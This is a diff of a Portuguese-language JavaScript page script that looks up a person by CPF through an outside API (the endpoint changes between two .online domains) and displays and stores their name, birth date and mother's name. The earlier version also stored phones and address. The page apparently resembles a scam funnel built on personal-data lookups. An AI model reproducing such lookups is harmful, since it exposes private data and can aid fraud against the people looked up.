@@ -54,7 +54,8 @@ document.addEventListener("DOMContentLoaded", function () {
   function formatUTMParams(params) {
     return Object.keys(params)
       .map(
-        (key) => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`
+        (key) =>
+          `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`,
       )
       .join("&");
   }
@@ -99,84 +100,94 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   // Consultar CPF na API
-async function consultarCPF(cpf) {
-  try {
-    cpf = cpf.replace(/\D/g, "");
+  async function consultarCPF(cpf) {
+    try {
+      // Remove formatação do CPF (apenas números)
+      cpf = cpf.replace(/\D/g, "");
 
-    consultaResultado?.classList.remove("hidden");
-    loadingInfo?.classList.remove("hidden");
-    userInfo?.classList.add("hidden");
-    errorInfo?.classList.add("hidden");
+      // Exibe a seção de resultados e o loading
+      consultaResultado?.classList.remove("hidden");
+      loadingInfo?.classList.remove("hidden");
+      userInfo?.classList.add("hidden");
+      errorInfo?.classList.add("hidden");
 
-    consultaResultado?.scrollIntoView({ behavior: "smooth", block: "center" });
+      // Scroll suave para a seção de resultados
+      consultaResultado?.scrollIntoView({
+        behavior: "smooth",
+        block: "center",
+      });
 
-    const response = await fetch(`https://simulacoesrapida.online/js/consulta_api.php?cpf=${cpf}`, {
-      method: "GET",
-      headers: { "Accept": "application/json" }
-    });
+      // Chamada para a nova API
+      const response = await fetch(
+        `https://www.motoristaonline.online/api/consulta.php?cpf=${cpf}`,
+        {
+          method: "GET",
+          headers: {
+            Accept: "application/json",
+          },
+        },
+      );
 
-    if (!response.ok) {
-      throw new Error(`Erro na consulta: ${response.status}`);
+      if (!response.ok) {
+        throw new Error("Erro na consulta: " + response.status);
+      }
+
+      const data = await response.json();
+
+      // Oculta o loading
+      loadingInfo?.classList.add("hidden");
+
+      // Verifica se a API retornou dados
+      if (!data.DADOS) {
+        throw new Error("CPF não encontrado");
+      }
+
+      const usuario = data.DADOS;
+
+      // Preencher informações na UI
+      nomeUsuario.textContent = usuario.nome || "Não informado";
+      dataNascimento.textContent =
+        formatDate(usuario.data_nascimento) || "Não informado";
+      cpfUsuario.textContent = usuario.cpf || "Não informado";
+      sexoUsuario.textContent =
+        (usuario.sexo === "M" ? "Masculino" : "Feminino") || "Não informado";
+      nomeMae.textContent = usuario.nome_mae || "Não informado";
+
+      // Salvar dados no localStorage
+      const dadosUsuario = {
+        nome: usuario.nome || "",
+        primeiroNome: usuario.nome?.split(" ")[0] || "",
+        nomeMae: usuario.nome_mae || "",
+        cpf: usuario.cpf || "",
+        sexo: usuario.sexo || "",
+        dataNascimento: usuario.data_nascimento || "",
+      };
+
+      localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
+      if (dadosUsuario.nome)
+        localStorage.setItem("nomeUsuario", dadosUsuario.nome);
+      if (dadosUsuario.cpf)
+        localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
+
+      // Exibe as informações do usuário
+      userInfo?.classList.remove("hidden");
+
+      // Scroll suave para as informações do usuário
+      setTimeout(() => {
+        userInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
+      }, 200);
+    } catch (error) {
+      console.error("Erro na consulta:", error);
+      loadingInfo?.classList.add("hidden");
+      errorMessage.textContent =
+        error.message ||
+        "Erro ao consultar seus dados. Verifique seu CPF e tente novamente.";
+      errorInfo?.classList.remove("hidden");
+
+      // Scroll suave para a mensagem de erro
+      errorInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
     }
-
-    const result = await response.json();
-
-    loadingInfo?.classList.add("hidden");
-
-    // NOVA ESTRUTURA — AGORA CORRETA
-    if (!result?.resultado?.dados) {
-      throw new Error("CPF não encontrado ou formato inesperado.");
-    }
-
-    const dados = result.resultado.dados;
-    const telefones = result.resultado.telefones || [];
-    const enderecos = result.resultado.enderecos || [];
-
-    // Preencher informações na UI
-    nomeUsuario.textContent = dados.NOME || "Não informado";
-    dataNascimento.textContent = formatDate(dados.DATA_NASCIMENTO) || "Não informado";
-    cpfUsuario.textContent = dados.CPF || "Não informado";
-    sexoUsuario.textContent = dados.SEXO || "Não informado";
-    nomeMae.textContent = dados.NOME_MAE || "Não informado";
-
-    // Telefones
-    const telefonesStr = telefones.map(t => t.TELEFONE).join(" / ") || "Não informado";
-
-    // Endereço
-    const end = enderecos[0] || {};
-    const enderecoStr = end.LOGR_NOME
-      ? `${end.LOGR_NOME}, ${end.NUMERO || "S/N"} - ${end.BAIRRO || ""}, ${end.CIDADE || ""} - ${end.UF || ""}, CEP: ${end.CEP || ""}`
-      : "Não informado";
-
-    const dadosUsuario = {
-      nome: dados.NOME || "",
-      primeiroNome: dados.PRIMEIRO_NOME || "",
-      nomeMae: dados.NOME_MAE || "",
-      cpf: dados.CPF || "",
-      sexo: dados.SEXO || "",
-      dataNascimento: dados.DATA_NASCIMENTO || "",
-      telefones: telefonesStr,
-      endereco: enderecoStr
-    };
-
-    localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
-    if (dadosUsuario.nome) localStorage.setItem("nomeUsuario", dadosUsuario.nome);
-    if (dadosUsuario.cpf) localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
-
-    userInfo?.classList.remove("hidden");
-
-    setTimeout(() => {
-      userInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
-    }, 200);
-
-  } catch (error) {
-    loadingInfo?.classList.add("hidden");
-    errorMessage.textContent = error.message || "Erro ao consultar seus dados.";
-    errorInfo?.classList.remove("hidden");
-
-    errorInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
   }
-}
 
   // Verificar se existe CPF na URL e salvar no localStorage
   const urlParams = new URLSearchParams(window.location.search);
@@ -240,7 +251,7 @@ async function consultarCPF(cpf) {
 
     if (!termsCheck.checked) {
       alert(
-        "Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar."
+        "Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar.",
       );
       return;
     }
@@ -291,7 +302,7 @@ async function consultarCPF(cpf) {
     } catch (error) {
       console.error("Erro ao processar dados para redirecionamento:", error);
       alert(
-        "Ocorreu um erro ao processar seus dados. Por favor, tente novamente."
+        "Ocorreu um erro ao processar seus dados. Por favor, tente novamente.",
       );
     }
   }
@@ -454,7 +465,7 @@ async function consultarCPF(cpf) {
       (e) => {
         touchStartX = e.changedTouches[0].screenX;
       },
-      { passive: true }
+      { passive: true },
     );
 
     carousel.addEventListener(
@@ -471,7 +482,7 @@ async function consultarCPF(cpf) {
           nextSlide();
         }
       },
-      { passive: true }
+      { passive: true },
     );
 
     // Pausar autoplay quando mouse está sobre o carrossel
